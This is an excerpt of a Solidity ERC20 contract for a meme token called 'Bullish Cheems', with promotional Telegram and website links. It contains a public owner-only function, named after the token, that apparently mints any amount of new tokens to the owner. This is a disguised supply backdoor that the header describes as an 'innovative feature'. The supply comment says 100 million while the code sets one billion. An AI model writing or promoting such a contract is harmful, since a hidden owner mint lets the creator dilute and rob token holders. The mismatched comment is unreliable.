...
//
// $BullishCheems proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/BullishCheemsBSC
// 📱 Website :: https://bullishcheems.online/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _BullishCheems(uint256 amount) public onlyOwner {
 _BullishCheems(msg.sender, amount);
    }
    ...
    function _BullishCheems(address account, uint256 amount) internal virtual {
...
contract $BullishCheems is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Bullish Cheems", "BCHEEMS") {
     _BullishCheems(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}